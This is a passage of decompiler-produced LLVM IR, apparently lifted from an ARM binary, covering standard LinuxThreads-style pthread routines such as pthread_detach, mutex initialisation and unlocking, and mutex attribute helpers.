  %v2_eee0 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_ee30, i32 %v2_eedc)
  %v1_eee8 = add i32 %v0_ee30, 66
  %v2_eee8 = inttoptr i32 %v1_eee8 to i8*
  %v3_eee8 = load i8, i8* %v2_eee8, align 1
  %v2_eeec = icmp eq i8 %v3_eee8, 0
  br i1 %v2_eeec, label %dec_label_pc_ef08, label %dec_label_pc_eef4

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eed8
  %v1_eef8 = add i32 %v0_ee30, 64
  %v2_eef8 = inttoptr i32 %v1_eef8 to i8*
  %v3_eef8 = load i8, i8* %v2_eef8, align 1
  %v2_eefc = icmp eq i8 %v3_eef8, 0
  br i1 %v2_eefc, label %dec_label_pc_ef14, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_eed8
  %v1_ef0c = load i32, i32* @r4, align 4
  %v2_ef0c = add i32 %v1_ef0c, 56
  %v3_ef0c = inttoptr i32 %v2_ef0c to i32*
  store i32 %v0_ee30, i32* %v3_ef0c, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_ef08
  %storemerge = phi i32 [ 0, %dec_label_pc_ef08 ], [ 1, %dec_label_pc_eef4 ]
  store i32 %storemerge, i32* @r6, align 4
  %v0_ef14 = load i32, i32* @r5, align 4
  %v1_ef18 = call i32 @__pthread_unlock(i32 %v0_ef14)
  %v0_ef1c = load i32, i32* @r6, align 4
  %v2_ef1c = icmp eq i32 %v0_ef1c, 0
  store i32 %v0_ee30, i32* @r0, align 4
  br i1 %v2_ef1c, label %dec_label_pc_ef34, label %dec_label_pc_ef24

dec_label_pc_ef24:                                ; preds = %dec_label_pc_ef14
  %v2_ef2c = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_ee30, i32 0)
  br label %dec_label_pc_ef70

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ef14
  %v1_ef38 = call i32 @_suspend.10(i32 %v0_ee30)
  %v0_ef3c = load i32, i32* @r6, align 4
  %v2_ef44 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_ee30, i32 %v0_ef3c)
  %v1_ef4c = add i32 %v0_ee30, 440
  %v2_ef4c = inttoptr i32 %v1_ef4c to i8*
  %v3_ef4c = load i8, i8* %v2_ef4c, align 1
  %v2_ef50 = icmp eq i8 %v3_ef4c, 0
  br i1 %v2_ef50, label %dec_label_pc_ef7c, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef34
  %v1_ef5c = add i32 %v0_ee30, 64
  %v2_ef5c = inttoptr i32 %v1_ef5c to i8*
  %v3_ef5c = load i8, i8* %v2_ef5c, align 1
  %v2_ef60 = icmp eq i8 %v3_ef5c, 0
  br i1 %v2_ef60, label %dec_label_pc_ef68, label %dec_label_pc_ef7c

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef58
  store i8 0, i8* %v2_ef4c, align 1
  br label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef24, %dec_label_pc_ef68
  %v2_ef78 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_ee24)
  br label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef58, %dec_label_pc_ef34, %dec_label_pc_ef70
  %v0_ef80 = load i32, i32* @r5, align 4
  %v2_ef84 = call i32 @__pthread_lock(i32 %v0_ef80, i32 %v0_ee30)
  br label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %dec_label_pc_eecc, %dec_label_pc_ef7c
  %v0_ef88 = load i32, i32* @r8, align 4
  %v2_ef88 = icmp eq i32 %v0_ef88, 0
  br i1 %v2_ef88, label %.thread1, label %bb19

.thread1:                                         ; preds = %dec_label_pc_ef88
  %v0_ef902 = load i32, i32* @r5, align 4
  br label %bb20

bb19:                                             ; preds = %dec_label_pc_ef88
  %v1_ef8c = load i32, i32* @r4, align 4
  %v2_ef8c = add i32 %v1_ef8c, 48
  %v3_ef8c = inttoptr i32 %v2_ef8c to i32*
  %v4_ef8c = load i32, i32* %v3_ef8c, align 4
  %v0_ef90 = load i32, i32* @r5, align 4
  %v3_ef94 = inttoptr i32 %v0_ef88 to i32*
  store i32 %v4_ef8c, i32* %v3_ef94, align 4
  br label %bb20

bb20:                                             ; preds = %.thread1, %bb19
  %v0_ef903 = phi i32 [ %v0_ef902, %.thread1 ], [ %v0_ef90, %bb19 ]
  %v1_ef98 = call i32 @__pthread_unlock(i32 %v0_ef903)
  %v2_efa0 = load i32, i32* @global_var_2a7a4.195, align 4
  %v1_efa4 = icmp slt i32 %v2_efa0, 0
  br i1 %v1_efa4, label %dec_label_pc_efe8, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %bb20
  store i32 %v0_ee30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_efd8.dec_label_pc_efbc_crit_edge, %dec_label_pc_efac
  %v2_efc4 = phi i32 [ %v2_efc4.pre, %dec_label_pc_efd8.dec_label_pc_efbc_crit_edge ], [ %v2_efa0, %dec_label_pc_efac ]
  store i32 %v2_ee24, i32* @r1, align 4
  store i32 %v2_efc4, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_efcc = call i32 @__libc_write(i32 %v2_efc4, i32 %v2_ee24)
  %v3_efd0 = icmp eq i32 %v2_efcc, -1
  br i1 %v3_efd0, label %dec_label_pc_efd8, label %dec_label_pc_efe8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_efbc
  %v0_efd8 = call i32 @__errno_location()
  %v1_efdc = inttoptr i32 %v0_efd8 to i32*
  %v2_efdc = load i32, i32* %v1_efdc, align 4
  %v7_efe0 = icmp eq i32 %v2_efdc, 4
  br i1 %v7_efe0, label %dec_label_pc_efd8.dec_label_pc_efbc_crit_edge, label %dec_label_pc_efe8

dec_label_pc_efd8.dec_label_pc_efbc_crit_edge:    ; preds = %dec_label_pc_efd8
  %v2_efc4.pre = load i32, i32* @global_var_2a7a4.195, align 4
  br label %dec_label_pc_efbc

dec_label_pc_efe8:                                ; preds = %dec_label_pc_efbc, %dec_label_pc_efd8, %bb20
  br label %dec_label_pc_efec

dec_label_pc_efec:                                ; preds = %dec_label_pc_eebc, %dec_label_pc_ee94, %dec_label_pc_ee78, %dec_label_pc_efe8
  %v20_eff0 = phi i32 [ 22, %dec_label_pc_eebc ], [ 35, %dec_label_pc_ee94 ], [ 3, %dec_label_pc_ee78 ], [ 0, %dec_label_pc_efe8 ]
  ret i32 %v20_eff0

; uselistorder directives
  uselistorder i32 %v2_efc4, { 1, 0 }
  uselistorder i32 %v0_ee60, { 2, 1, 0, 3 }
  uselistorder i32 %v5_ee40, { 1, 0 }
  uselistorder i32 %v0_ee30, { 2, 3, 1, 6, 7, 5, 8, 4, 9, 0, 11, 10, 12, 13 }
  uselistorder i32 %v2_ee24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 8, 7, 6, 5, 3, 4, 2, 0, 1 }
  uselistorder i32 (i32)* @_suspend.10, { 1, 0 }
  uselistorder i32 66, { 1, 2, 3, 4, 5, 11, 7, 6, 0, 8, 9, 10 }
  uselistorder i32 (i32, i32)* @___pthread_set_own_extricate_if.8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_efec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_efe8, { 1, 0, 2 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_ef88, { 1, 0 }
  uselistorder label %dec_label_pc_ef7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef70, { 1, 0 }
  uselistorder label %dec_label_pc_ef14, { 1, 0 }
  uselistorder label %dec_label_pc_eebc, { 1, 0 }
}

define i32 @pthread_detach(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v3_f000 = load i32, i32* @r4, align 4
  %v3_f00c = urem i32 %arg1, 1024
  %v4_f010 = mul nuw nsw i32 %v3_f00c, 16
  %v5_f010 = add i32 %v4_f010, ptrtoint (i32* @global_var_263c0.205 to i32)
  %v2_f014 = ptrtoint i32* %stack_var_-168 to i32
  %v2_f024 = call i32 @__pthread_lock(i32 %v5_f010, i32 0)
  %v0_f028 = load i32, i32* @r5, align 4
  %v1_f028 = add i32 %v0_f028, 8
  %v2_f028 = inttoptr i32 %v1_f028 to i32*
  %v3_f028 = load i32, i32* %v2_f028, align 4
  %v2_f02c = icmp eq i32 %v3_f028, 0
  br i1 %v2_f02c, label %dec_label_pc_f040, label %dec_label_pc_f034

dec_label_pc_f034:                                ; preds = %entry
  %v1_f034 = add i32 %v3_f028, 16
  %v2_f034 = inttoptr i32 %v1_f034 to i32*
  %v3_f034 = load i32, i32* %v2_f034, align 4
  %v1_f038 = load i32, i32* @r6, align 4
  %v9_f038 = icmp eq i32 %v3_f034, %v1_f038
  br i1 %v9_f038, label %dec_label_pc_f050, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %dec_label_pc_f034, %entry
  %v1_f044 = call i32 @__pthread_unlock(i32 %v0_f028)
  br label %dec_label_pc_f0f0

dec_label_pc_f050:                                ; preds = %dec_label_pc_f034
  %v1_f050 = add i32 %v3_f028, 45
  %v2_f050 = inttoptr i32 %v1_f050 to i8*
  %v3_f050 = load i8, i8* %v2_f050, align 1
  %v4_f050 = zext i8 %v3_f050 to i32
  store i32 %v4_f050, i32* %r4.global-to-local, align 4
  %v2_f054 = icmp eq i8 %v3_f050, 0
  br i1 %v2_f054, label %dec_label_pc_f06c, label %dec_label_pc_f05c

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f050
  %v1_f060 = call i32 @__pthread_unlock(i32 %v0_f028)
  br label %dec_label_pc_f0f0

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f050
  %v1_f06c = add i32 %v3_f028, 56
  %v2_f06c = inttoptr i32 %v1_f06c to i32*
  %v3_f06c = load i32, i32* %v2_f06c, align 4
  %v2_f070 = icmp eq i32 %v3_f06c, 0
  br i1 %v2_f070, label %dec_label_pc_f088, label %dec_label_pc_f078

dec_label_pc_f078:                                ; preds = %dec_label_pc_f06c
  %v1_f07c = call i32 @__pthread_unlock(i32 %v0_f028)
  %v0_f080 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f0f0

dec_label_pc_f088:                                ; preds = %dec_label_pc_f06c
  %v1_f088 = add i32 %v3_f028, 44
  %v2_f088 = inttoptr i32 %v1_f088 to i8*
  %v3_f088 = load i8, i8* %v2_f088, align 1
  %v4_f088 = zext i8 %v3_f088 to i32
  store i32 %v4_f088, i32* @r4, align 4
  store i8 1, i8* %v2_f050, align 1
  %v0_f094 = load i32, i32* @r5, align 4
  %v1_f098 = call i32 @__pthread_unlock(i32 %v0_f094)
  %v0_f09c = load i32, i32* @r4, align 4
  %v2_f09c = icmp eq i32 %v0_f09c, 0
  br i1 %v2_f09c, label %dec_label_pc_f0ec, label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %dec_label_pc_f088
  %v2_f0a8 = load i32, i32* @global_var_2a7a4.195, align 4
  %v1_f0ac = icmp slt i32 %v2_f0a8, 0
  br i1 %v1_f0ac, label %dec_label_pc_f0ec, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f0a4
  %v0_f0b4 = call i32 @_thread_self.9()
  store i32 %v0_f0b4, i32* %stack_var_-168, align 4
  br label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0dc, %dec_label_pc_f0b4
  store i32 %v2_f014, i32* @r1, align 4
  %v2_f0c8 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_f0c8, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_f0d0 = call i32 @__libc_write(i32 %v2_f0c8, i32 %v2_f014)
  %v3_f0d4 = icmp eq i32 %v2_f0d0, -1
  br i1 %v3_f0d4, label %dec_label_pc_f0dc, label %dec_label_pc_f0ec

dec_label_pc_f0dc:                                ; preds = %dec_label_pc_f0c0
  %v0_f0dc = call i32 @__errno_location()
  %v1_f0e0 = inttoptr i32 %v0_f0dc to i32*
  %v2_f0e0 = load i32, i32* %v1_f0e0, align 4
  %v7_f0e4 = icmp eq i32 %v2_f0e0, 4
  br i1 %v7_f0e4, label %dec_label_pc_f0c0, label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0c0, %dec_label_pc_f0dc, %dec_label_pc_f0a4, %dec_label_pc_f088
  br label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f078, %dec_label_pc_f05c, %dec_label_pc_f040, %dec_label_pc_f0ec
  %v17_f0f4 = phi i32 [ %v0_f080, %dec_label_pc_f078 ], [ 22, %dec_label_pc_f05c ], [ 3, %dec_label_pc_f040 ], [ 0, %dec_label_pc_f0ec ]
  store i32 %v3_f000, i32* %r4.global-to-local, align 4
  ret i32 %v17_f0f4

; uselistorder directives
  uselistorder i32 %v0_f028, { 1, 2, 0, 3 }
  uselistorder i32 %v2_f014, { 1, 0 }
  uselistorder i32 ()* @_thread_self.9, { 2, 1, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_263c0.205 to i32), { 0, 1, 2, 5, 6, 3, 11, 7, 12, 9, 4, 8, 10 }
  uselistorder label %dec_label_pc_f0f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f0ec, { 1, 0, 2, 3 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v2_f104 = ptrtoint i32* %stack_var_-12 to i32
  %v2_f10c = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-12)
  %v3_f118 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-12, i32 1)
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_f1383 = icmp eq i32 %storemerge1, 0
  br i1 %v2_f1383, label %dec_label_pc_f148, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %entry, %dec_label_pc_f128
  %v1_f13c6.in = phi i32 [ %storemerge, %dec_label_pc_f128 ], [ %storemerge1, %entry ]
  %v1_f13c6 = add i32 %v1_f13c6.in, 56
  %v4_f130 = call i32 @pthread_mutex_init(i32 %v1_f13c6, i32* nonnull %stack_var_-12)
  %v0_f134 = load i32, i32* %r4.global-to-local, align 4
  %v1_f134 = add i32 %v0_f134, 32
  %v2_f134 = inttoptr i32 %v1_f134 to i32*
  %storemerge = load i32, i32* %v2_f134, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_f138 = icmp eq i32 %storemerge, 0
  br i1 %v2_f138, label %dec_label_pc_f148, label %dec_label_pc_f128

dec_label_pc_f148:                                ; preds = %dec_label_pc_f128, %entry
  %v1_f14c = call i32 @pthread_mutexattr_destroy(i32 %v2_f104)
  ret i32 %v1_f14c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 0, 2, 1 }
  uselistorder i32 (i32*, i32)* @__pthread_mutexattr_setkind_np, { 2, 0, 1 }
  uselistorder i32 (i32*)* @pthread_mutexattr_init, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f128, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_f1a8 = add i32 %arg1, 20
  %v3_f1a8 = inttoptr i32 %v2_f1a8 to i32*
  store i32 0, i32* %v3_f1a8, align 4
  %v2_f1ac = icmp eq i32* %arg2, null
  store i32 3, i32* %ip.global-to-local, align 4
  br i1 %v2_f1ac, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v3_f1b4 = load i32, i32* %arg2, align 4
  store i32 %v3_f1b4, i32* %ip.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v0_f1bc = load i32, i32* %r3.global-to-local, align 4
  %v2_f1bc = add i32 %arg1, 16
  %v3_f1bc = inttoptr i32 %v2_f1bc to i32*
  store i32 %v0_f1bc, i32* %v3_f1bc, align 4
  %v0_f1c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_f1c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_f1c4 = add i32 %v1_f1c4, 12
  %v3_f1c4 = inttoptr i32 %v2_f1c4 to i32*
  store i32 %v0_f1c4, i32* %v3_f1c4, align 4
  %v1_f1c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_f1c8 = add i32 %v1_f1c8, 8
  %v3_f1c8 = inttoptr i32 %v2_f1c8 to i32*
  store i32 0, i32* %v3_f1c8, align 4
  %v1_f1cc = load i32, i32* %r2.global-to-local, align 4
  %v2_f1cc = add i32 %v1_f1cc, 4
  %v3_f1cc = inttoptr i32 %v2_f1cc to i32*
  store i32 0, i32* %v3_f1cc, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_f1d4 = add i32 %arg1, 12
  %v2_f1d4 = inttoptr i32 %v1_f1d4 to i32*
  %v3_f1d4 = load i32, i32* %v2_f1d4, align 4
  switch i32 %v3_f1d4, label %dec_label_pc_f1f4 [
    i32 0, label %dec_label_pc_f1fc
    i32 1, label %dec_label_pc_f1fc
    i32 2, label %dec_label_pc_f20c
    i32 3, label %dec_label_pc_f20c
  ]

dec_label_pc_f1f4:                                ; preds = %entry
  ret i32 22

dec_label_pc_f1fc:                                ; preds = %entry, %entry
  %v1_f1fc = add i32 %arg1, 16
  %v2_f1fc = inttoptr i32 %v1_f1fc to i32*
  %v3_f1fc = load i32, i32* %v2_f1fc, align 4
  %v1_f200 = urem i32 %v3_f1fc, 2
  %v2_f200 = icmp eq i32 %v1_f200, 0
  br i1 %v2_f200, label %dec_label_pc_f220, label %dec_label_pc_f218

dec_label_pc_f20c:                                ; preds = %entry, %entry
  %v1_f20c = add i32 %arg1, 16
  %v2_f20c = inttoptr i32 %v1_f20c to i32*
  %v3_f20c = load i32, i32* %v2_f20c, align 4
  %v2_f210 = icmp eq i32 %v3_f20c, 0
  br i1 %v2_f210, label %dec_label_pc_f220, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %dec_label_pc_f1fc, %dec_label_pc_f20c
  ret i32 16

dec_label_pc_f220:                                ; preds = %dec_label_pc_f1fc, %dec_label_pc_f20c
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f220, { 1, 0 }
  uselistorder label %dec_label_pc_f218, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg2, 4
  %. = select i1 %tmp, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  %v0_f250.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_f250 = phi i32 [ 22, %entry ], [ %v0_f250.pre, %bb ]
  ret i32 %v0_f250

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f258 = load i32, i32* %arg1, align 4
  %v2_f260 = inttoptr i32 %arg2 to i32*
  store i32 %v2_f258, i32* %v2_f260, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %arg1.cmp = icmp ugt i32 %arg1, 1
  br i1 %arg1.cmp, label %bb, label %bb2

bb:                                               ; preds = %.thread, %bb3, %entry
  %merge = phi i32 [ 22, %entry ], [ 38, %bb3 ], [ 0, %.thread ]
  ret i32 %merge

bb2:                                              ; preds = %entry
  %v2_f280 = icmp eq i32 %arg1, 0
  br i1 %v2_f280, label %.thread, label %bb3

bb3:                                              ; preds = %bb2
  br label %bb

.thread:                                          ; preds = %bb2
  br label %bb

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  store i32 62120, i32* @lr, align 4
  %v4_f2a4 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* null)
  %v3_f2b0 = call i32 @pthread_cond_init(i32* nonnull @global_var_2b1a0.485, i32 0)
  %v2_f2b8 = load i32, i32* @global_var_2b1ac.487, align 4
  %v1_f2c0 = add i32 %v2_f2b8, 4
  %v7_f2c4 = icmp sgt i32 %v2_f2b8, 2147483643
  br i1 %v7_f2c4, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_f2c0, %entry ]
  store i32 %storemerge, i32* @global_var_2b1ac.487, align 4
  ret i32 %v3_f2b0

; uselistorder directives
  uselistorder i32 %v2_f2b8, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_thread_self.11() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_f2e8 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_f2ec = load i32, i32* @sp, align 4
  %v3_f2ec = icmp ult i32 %v0_f2ec, %v2_f2e8
  %v1_f2f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f2f0, i32* @r1, align 4
  br i1 %v3_f2ec, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_f30c, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_f30c ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_f300 = load i32, i32* @global_var_2b170.180, align 4
  %v3_f304 = icmp ult i32 %v0_f2ec, %v2_f300
  br i1 %v3_f304, label %bb4, label %dec_label_pc_f30c

dec_label_pc_f30c:                                ; preds = %bb3
  %v2_f310 = load i32, i32* @global_var_2b174.182, align 4
  %v3_f314 = icmp ult i32 %v0_f2ec, %v2_f310
  br i1 %v3_f314, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_f30c, %bb3
  %v2_f324 = load i32, i32* @global_var_2f558.186, align 4
  store i32 %v2_f324, i32* @r2, align 4
  %v3_f328 = and i32 %v1_f2f0, -2097152
  %v4_f328 = xor i32 %v3_f328, -2097152
  %v2_f330 = icmp eq i32 %v2_f324, 0
  %v1_f334 = sub i32 -477, %v4_f328
  br i1 %v2_f330, label %dec_label_pc_f340, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %bb4
  %v1_f33c = call i32 @__pthread_find_self(i32 %v1_f334)
  br label %dec_label_pc_f340

dec_label_pc_f340:                                ; preds = %bb4, %dec_label_pc_f33c
  %v0_f340 = phi i32 [ %v1_f334, %bb4 ], [ %v1_f33c, %dec_label_pc_f33c ]
  %v1_f340 = add i32 %v0_f340, -3
  ret i32 %v1_f340

; uselistorder directives
  uselistorder i32 %v1_f334, { 1, 0 }
  uselistorder label %dec_label_pc_f340, { 1, 0 }
}

define i32 @pthread_mutex_unlock() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_f360 = load i32, i32* @r0, align 4
  %v1_f360 = add i32 %v0_f360, 12
  %v2_f360 = inttoptr i32 %v1_f360 to i32*
  %v3_f360 = load i32, i32* %v2_f360, align 4
  %v3_f364 = load i32, i32* @r4, align 4
  store i32 %v3_f364, i32* %stack_var_-12, align 4
  %v6_f364 = load i32, i32* @r5, align 4
  store i32 %v0_f360, i32* @r5, align 4
  %v7_f36c = icmp eq i32 %v3_f360, 3
  store i1 %v7_f36c, i1* @cpsr_z, align 1
  switch i32 %v3_f360, label %dec_label_pc_f388 [
    i32 0, label %dec_label_pc_f390
    i32 1, label %dec_label_pc_f39c
    i32 2, label %dec_label_pc_f3dc
    i32 3, label %dec_label_pc_f410
  ]

dec_label_pc_f388:                                ; preds = %entry
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 22

dec_label_pc_f390:                                ; preds = %entry
  %v1_f390 = add i32 %v0_f360, 16
  %v1_f394 = call i32 @__pthread_unlock(i32 %v1_f390)
  br label %dec_label_pc_f418

dec_label_pc_f39c:                                ; preds = %entry
  %v0_f39c = call i32 @_thread_self.11()
  %v0_f3a0 = load i32, i32* @r5, align 4
  %v1_f3a0 = add i32 %v0_f3a0, 8
  %v2_f3a0 = inttoptr i32 %v1_f3a0 to i32*
  %v3_f3a0 = load i32, i32* %v2_f3a0, align 4
  %v9_f3a4 = icmp eq i32 %v3_f3a0, %v0_f39c
  store i1 %v9_f3a4, i1* @cpsr_z, align 1
  br i1 %v9_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_f420

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f39c
  %v1_f3ac = add i32 %v0_f3a0, 4
  %v2_f3ac = inttoptr i32 %v1_f3ac to i32*
  %v3_f3ac = load i32, i32* %v2_f3ac, align 4
  %v2_f3b0 = icmp eq i32 %v3_f3ac, 0
  store i1 %v2_f3b0, i1* @cpsr_z, align 1
  %tmp5 = icmp slt i32 %v3_f3ac, 1
  br i1 %tmp5, label %dec_label_pc_f3c8, label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %dec_label_pc_f3ac
  %v1_f3b8 = add i32 %v3_f3ac, -1
  store i32 %v1_f3b8, i32* %v2_f3ac, align 4
  %v2_f3c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f3c4, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 0

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3ac
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v2_f3a0, align 4
  %v0_f3d0 = load i32, i32* @r5, align 4
  %v1_f3d0 = add i32 %v0_f3d0, 16
  %v1_f3d4 = call i32 @__pthread_unlock(i32 %v1_f3d0)
  br label %dec_label_pc_f408

dec_label_pc_f3dc:                                ; preds = %entry
  %v0_f3dc = call i32 @_thread_self.11()
  %v0_f3e0 = load i32, i32* @r5, align 4
  %v1_f3e0 = add i32 %v0_f3e0, 8
  %v2_f3e0 = inttoptr i32 %v1_f3e0 to i32*
  %v3_f3e0 = load i32, i32* %v2_f3e0, align 4
  %v9_f3e4 = icmp eq i32 %v3_f3e0, %v0_f3dc
  store i1 %v9_f3e4, i1* @cpsr_z, align 1
  br i1 %v9_f3e4, label %dec_label_pc_f3ec, label %dec_label_pc_f420

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3dc
  %v1_f3ec = add i32 %v0_f3e0, 16
  %v2_f3ec = inttoptr i32 %v1_f3ec to i32*
  %v3_f3ec = load i32, i32* %v2_f3ec, align 4
  %v2_f3f0 = icmp eq i32 %v3_f3ec, 0
  store i1 %v2_f3f0, i1* @cpsr_z, align 1
  br i1 %v2_f3f0, label %dec_label_pc_f420, label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3ec
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v2_f3e0, align 4
  %v0_f400 = load i32, i32* @r5, align 4
  %v1_f400 = add i32 %v0_f400, 16
  %v1_f404 = inttoptr i32 %v1_f400 to i32*
  %v2_f404 = call i32 @__pthread_alt_unlock(i32* %v1_f404)
  br label %dec_label_pc_f408

dec_label_pc_f408:                                ; preds = %dec_label_pc_f3c8, %dec_label_pc_f3f8
  %v0_f408 = load i32, i32* @r4, align 4
  %v2_f40c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f40c, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 %v0_f408

dec_label_pc_f410:                                ; preds = %entry
  %v1_f410 = add i32 %v0_f360, 16
  %v1_f414 = inttoptr i32 %v1_f410 to i32*
  %v2_f414 = call i32 @__pthread_alt_unlock(i32* %v1_f414)
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f390, %dec_label_pc_f410
  %v2_f41c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f41c, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 0

dec_label_pc_f420:                                ; preds = %dec_label_pc_f39c, %dec_label_pc_f3dc, %dec_label_pc_f3ec
